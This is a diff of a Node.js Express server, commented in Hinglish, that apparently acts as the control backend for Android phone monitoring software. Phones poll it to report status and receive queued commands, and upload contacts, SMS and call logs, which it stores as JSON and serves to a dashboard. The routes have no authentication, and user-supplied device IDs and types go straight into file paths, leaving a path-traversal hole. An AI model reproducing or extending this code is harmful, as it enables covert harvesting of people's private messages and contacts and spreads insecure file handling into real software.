@@ -7,99 +7,96 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 1. CORS & JSON Setup
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
+
+// --- YE DO LINE ZAROORI HAIN ---
+// Ye JSON data ke liye hai
+app.use(bodyParser.json({ limit: '50mb' })); 
+// Ye aapke Android (@Field) data ke liye hai
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+
 app.use(express.static(__dirname));
 
-// 2. Data Directory Setup
 const DATA_DIR = path.join(__dirname, 'data');
-if (!fs.existsSync(DATA_DIR)) {
-    fs.mkdirSync(DATA_DIR, { recursive: true });
-}
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 
 let deviceState = {}; 
 
-// 3. API: Dashboard Status (Har 3 sec mein dashboard ise call karta hai)
+// 1. API: Dashboard Status
 app.get('/api/device-status/:deviceId', (req, res) => {
     const state = deviceState[req.params.deviceId] || { isOnline: false };
     const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 30000 : false;
     res.json({ ...state, isOnline });
 });
 
-// 4. API: Send Command (Jab aap dashboard par button dabate ho)
+// 2. API: Send Command (Dashboard se)
 app.post('/api/send-command', (req, res) => {
     const { device_id, command } = req.body;
     if (!deviceState[device_id]) deviceState[device_id] = {};
-    
     deviceState[device_id].currentCommand = command;
-    console.log(`🚀 [COMMAND] New command set for ${device_id}: ${command}`);
-    res.json({ status: "success", message: "Command queued" });
+    console.log(`🚀 Command set: ${command} for ${device_id}`);
+    res.json({ status: "success" });
 });
 
-// 5. API: Phone Status Update (Phone har waqt ise call karta hai)
+// 3. API: Phone Status Update (Aapka @Field wala code yahan data bhejega)
 app.post('/api/update-status', (req, res) => {
+    // Android @Field se data 'req.body' mein hi aata hai
     const { device_id, model, android_version, battery, ringerMode } = req.body;
     
-    if (!device_id) return res.status(400).send("No Device ID");
-
-    // Phone ka status update karein
-    deviceState[device_id] = {
-        ...deviceState[device_id], // Purani commands save rakhega
-        model: model || "Android Device",
-        android_version: android_version || "--",
-        battery: battery || 0,
-        ringerMode: ringerMode || "normal",
-        lastSeen: Date.now()
-    };
-    
-    // Command check karein
-    const cmd = deviceState[device_id].currentCommand || "none";
-    
-    // Agar koi real command hai (none nahi hai), toh phone ko bhej kar reset karein
-    if (cmd !== "none") {
-        console.log(`📡 [DISPATCH] Phone ${device_id} is picking up: ${cmd}`);
-        deviceState[device_id].currentCommand = "none"; 
+    if (device_id) {
+        deviceState[device_id] = {
+            model: model || "Android",
+            android_version: android_version || "--",
+            battery: battery || 0,
+            ringerMode: ringerMode || "normal",
+            lastSeen: Date.now(),
+            currentCommand: deviceState[device_id]?.currentCommand || "none"
+        };
     }
-
+    
+    const cmd = deviceState[device_id]?.currentCommand || "none";
+    if (cmd !== "none") deviceState[device_id].currentCommand = "none";
+    
+    console.log(`📡 Status check from ${device_id}. Sending command: ${cmd}`);
     res.json({ command: cmd });
 });
 
-// 6. API: Data Upload (Jab phone contacts/sms bhejta hai)
+// 4. API: Data Upload (@Field Contacts/SMS/Calls)
 app.post('/api/upload-data', (req, res) => {
+    // Form data se 'device_id', 'type', 'data' nikalna
     const { device_id, type, data } = req.body; 
-    
+
     if (!device_id || !type || !data) {
-        return res.status(400).send("Missing parameters");
+        console.log("❌ Incomplete data received");
+        return res.status(400).send("Missing Data");
     }
 
     const fileName = `${device_id}_${type}.json`;
     const filePath = path.join(DATA_DIR, fileName);
     
     try {
-        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-        console.log(`📂 [SAVED] ${type.toUpperCase()} data saved for ${device_id}`);
-        res.status(200).send("Data saved successfully");
+        // Android String JSON ko parse karke sundar format mein save karna
+        let parsedData = (typeof data === 'string') ? JSON.parse(data) : data;
+        
+        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
+        console.log(`📂 [SAVED] ${type} for ${device_id}`);
+        res.send("Saved Successfully");
     } catch (err) {
-        console.error("Save error:", err);
-        res.status(500).send("Internal Server Error");
+        console.error("❌ Save error:", err);
+        res.status(500).send("Error saving data");
     }
 });
 
-// 7. API: Get Data (Dashboard view pages ke liye)
+// 5. API: Dashboard Data Fetch
 app.get('/api/get-data/:deviceId/:type', (req, res) => {
-    const { deviceId, type } = req.params;
-    const filePath = path.join(DATA_DIR, `${deviceId}_${type}.json`);
-    
+    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
-        console.log(`⚠️ [NOT FOUND] File for ${type} not available yet`);
-        res.json([]); // Khali array bhejo agar file nahi hai
+        res.json([]);
     }
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Server is running on port ${PORT}`);
+    console.log(`✅ Server is running with Form-Data support on port ${PORT}`);
 });
